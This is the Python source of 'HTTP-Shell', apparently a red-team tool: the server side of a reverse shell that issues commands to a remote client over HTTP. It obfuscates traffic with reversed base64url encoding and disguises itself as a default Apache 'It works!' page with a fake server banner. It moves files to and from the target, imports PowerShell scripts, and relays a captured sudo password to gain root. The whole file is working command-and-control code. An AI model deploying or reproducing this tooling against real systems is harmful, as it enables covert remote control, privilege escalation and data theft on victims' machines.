#!/usr/bin/python3
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

import os
import oslex
import base64
import pwinput
import readline
import neotermcolor
from neotermcolor import colored
from http.server import BaseHTTPRequestHandler, HTTPServer

cmd_response = True
sudo = False ; root = False
command = None ; prompt = None
local_path = None ; remote_path = None
first_run = True ; wait_for_cmd = False
neotermcolor.readline_always_safe = True

banner = """
  _   _ _____ _____ ____      ____  _          _ _ 
 | | | |_   _|_   _|  _ \    / ___|| |__   ___| | |
 | |_| | | |   | | | |_) |___\___ \| "_ \ / _ \ | |
 |  _  | | |   | | |  __/_____|__) | | | |  __/ | |
 |_| |_| |_|   |_| |_|       |____/|_| |_|\___|_|_|"""                                    

banner2 = """                                               
  ---------------- by @JoelGMSec -----------------
"""

class MyServer(BaseHTTPRequestHandler):
    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def encode_file_revbase64url(self, file_content):
        try:
            encoded = base64.b64encode(file_content).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def encode_reversed_base64url(self, plain_data):
        try:
            encoded = base64.b64encode(plain_data.encode("utf-8")).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def decode_file_revbase64url(self, file_content):
        try:
            encoded_data = file_content[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data)
            return decoded_data
        except:
            pass

    def decode_reversed_base64url(self, encoded_data):
        try:
            encoded_data = encoded_data[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data).decode("utf-8")
            return decoded_data
        except:
            pass

    def do_GET(self):
        global cmd_response
        global wait_for_cmd ; global root
        global prompt ; global first_run ; global sudo
        global local_path ; global remote_path ; global command 
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        try:
            if self.path == "/api/v1/Client/Download":
                try:
                    with open(local_path, "rb") as filename:
                        file_content = filename.read()
                        encoded_file = "File: "
                        encoded_file += self.encode_file_revbase64url(file_content)
                        self._set_headers()
                        self.wfile.write(encoded_file.encode("utf-8"))
                except:
                    print(colored(f"[!] Error reading \"{filename}\" file!\n", "red"))

            elif self.path == "/api/v1/Client/Token":
                if root:
                    whoami = "root"
                else:
                    whoami = prompt.split("!")[0].split("@")[0]
                hostname = prompt.split("!")[0].split("@")[1]
                path = prompt.split("!")[-1]
                cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
                old_user = whoami

                if "\\" in path:
                    slash = "\\"
                else:
                    slash = "/"

                if len(str(path).rstrip()) > 24:
                    shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
                else:
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                cinput += (colored(" ", "yellow"))
                if cmd_response:  
                    command = input(cinput + "\001\033[0m\002")
                    split_cmd = command.split()

                if command == "" or command == None or not command:
                    print()
                
                if command == "exit":
                    if root:
                        whoami = old_user
                        root = False ; command = None
                        print()
                    else:
                        print (colored("[!] Exiting..\n", "red"))
                        exit(0)

                if command == "kill":
                    command = "exit"

                if command == "clear" or command == "cls":
                    os.system("clear")
                    command = None

                if "sudo" in command.split()[0]:
                    if not ":" in path:
                        args = oslex.split(command)
                        if len(args) < 2:
                            print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
                            command = None
                        else:
                            if not sudo:
                                old_cmd = ' '.join(args[1:])
                                print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
                                sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
                                wait_for_cmd = True ; sudo = True
                                if "su" in args:
                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
                                    root = True
                            else:
                                old_cmd = ' '.join(args[1:])
                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
                                if "su" in args:
                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
                                    root = True

                if "upload" in command.split()[0]:
                    args = oslex.split(command)
                    if len(args) < 3 or len(args) > 3:
                        print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
                        command = None
                    else:
                        local_path = args[1]
                        remote_path = args[2]
                        command = "upload " + args[1] + "!" + args[2]
                        print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))

                if "download" in command.split()[0]:
                    args = oslex.split(command)
                    if len(args) < 3 or len(args) > 3:
                        print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
                        command = None
                    else:
                        remote_path = args[1]
                        local_path = args[2]
                        command = "download " + args[1] + "!" + args[2]
                        print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))

                if "import-ps1" in command.split()[0]:
                    args = oslex.split(command)
                    if len(args) < 2 or len(args) > 2:
                        print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                        command = None
                    else:  
                        try:
                            filename = args[1]
                            with open(filename, "rb") as f:
                                command = f.read().decode()
                                print(colored(f"[!] File \"{filename}\" imported successfully!", "green"))

                        except FileNotFoundError:
                            print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
                            command = None

                if "help" in command.split()[0]:
                    print(colored("[+] Available commands:","green"))
                    print(colored("    upload: Upload a file from local to remote computer","blue"))
                    print(colored("    download: Download a file from remote to local computer","blue"))
                    print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
                    print(colored("    clear/cls: Clear terminal screen","blue"))
                    print(colored("    kill: Kill client connection","blue"))
                    print(colored("    exit: Exit from program\n","blue"))
                    command = None

                if command is not None:
                    if root and not "cd" in command:
                        if not wait_for_cmd and not "exit" in command:
                            old_cmd = command
                            command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)

                    first_run = False
                    cmd_response = False
                    encoded_command = "Token: "
                    encoded_command += self.encode_reversed_base64url(command)
                    self._set_headers()
                    self.wfile.write(encoded_command.encode("utf-8"))
                    
                    if command == "exit":
                        print (colored("[!] Exiting..\n", "red"))
                        exit(0)
                
            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
            pass

        return first_run, command, wait_for_cmd, sudo, root, cmd_response

    def do_POST(self):
        global cmd_response
        global wait_for_cmd ; global root
        global prompt ; global first_run ; global sudo
        global local_path ; global remote_path ; global command 
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        try:
            self._set_headers() ; response = "Success"
            content_length = int(self.headers["Content-Length"])
            encoded_data = self.rfile.read(content_length).decode("utf-8")
            encoded_payload = encoded_data.split()[-1]

            if str("Info:") in encoded_data:
                prompt = self.decode_reversed_base64url(encoded_payload)

            else:
                decoded_payload = self.decode_reversed_base64url(encoded_payload)

            if self.path == "/api/v1/Client/Info":
                self.wfile.write(response.encode())

            elif self.path == "/api/v1/Client/Upload":
                try:
                    with open(local_path, "wb") as filename:
                        file_content = self.decode_file_revbase64url(encoded_payload)
                        filename.write(file_content)
                        self.wfile.write(response.encode())
                except:
                    print(colored(f"[!] Error writing \"{filename}\" file!\n", "red"))

            elif self.path == "/api/v1/Client/Debug":
                if not first_run and command is not None:
                    cmd_response = True
                    if decoded_payload == "" or not decoded_payload:
                        print()
                    else:
                        lines = decoded_payload.split("\n")
                        while lines and lines[0].strip() == "":
                            lines.pop(0)
                        while lines and lines[-1].strip() == "":
                            lines.pop(-1)
                        if lines:
                            lines[0] = lines[0].lstrip()
                        decoded_payload = "\n".join(lines)
                    if wait_for_cmd:
                        wait_for_cmd = False ; sudo = True
                    if "[sudo]" in decoded_payload:
                        lines = decoded_payload.split("\n")
                        filtered_lines = [line for line in lines if "[sudo]" not in line]
                        decoded_payload = "\n".join(filtered_lines)
                        print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                    else:
                        if "HTTPShellNull" in decoded_payload:
                            print()
                        else:
                            print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                self.wfile.write(response.encode())

            elif self.path == "/api/v1/Client/Error":
                if not first_run and command is not None:
                    cmd_response = True
                    if decoded_payload == "" or not decoded_payload:
                        print()
                    else:
                        lines = decoded_payload.split("\n")
                        while lines and lines[0].strip() == "":
                            lines.pop(0)
                        while lines and lines[-1].strip() == "":
                            lines.pop(-1)
                        if lines:
                            lines[0] = lines[0].lstrip()
                        decoded_payload = "\n".join(lines)
                    if wait_for_cmd:
                        wait_for_cmd = False ; sudo = False
                    if "[sudo]" in decoded_payload:
                        if not root:
                            lines = decoded_payload.split("\n")
                            filtered_lines = [line for line in lines if "[sudo]" not in line]
                            decoded_payload = "\n".join(filtered_lines)
                            print(colored(decoded_payload.rstrip()+"\n", "red"))
                        else:
                            print(colored("Sorry, try again.\nsudo: 1 incorrect password attempt\n", "red"))
                            root = False
                    elif "HTTP-Client.sh" in decoded_payload:
                        decoded_payload = decoded_payload.split(":")[-1]
                        replace_payload = "bash: " + command + ":" + decoded_payload
                        print(colored(replace_payload.rstrip()+"\n", "red"))
                    elif "EmptyStringNotAllowed" in decoded_payload:
                        pass
                    elif "Invoke-WebRequest" in decoded_payload:
                        pass
                    elif "No such file or directory" in decoded_payload:
                        print(colored(decoded_payload.rstrip()+"\n", "red"))
                    else:
                        if "HTTPShellNull" in decoded_payload:
                            print()
                        else:
                            print(colored(decoded_payload.rstrip()+"\n", "red"))
                self.wfile.write(response.encode())

            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except:
            pass

        return prompt, cmd_response

    def log_message(self, format, *args):
            pass

def run(server_class=HTTPServer, handler_class=MyServer, port=80):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print(colored(f"[>] Waiting for connection on port {port}..\n", "yellow"))
    httpd.serve_forever()

if __name__ == "__main__":
    while True:
        try:
            print (colored(banner, "blue"))
            print (colored(banner2, "green"))
            from sys import argv

            if len(argv) == 2:
                if "-h" in argv[1]:
                    print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                    exit(0)
                else:
                    run(port=int(argv[1]))
            else:
                print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                exit(0)

        except KeyboardInterrupt:
            print (colored("\n[!] Exiting..", "red"))
            exit(0)
            break
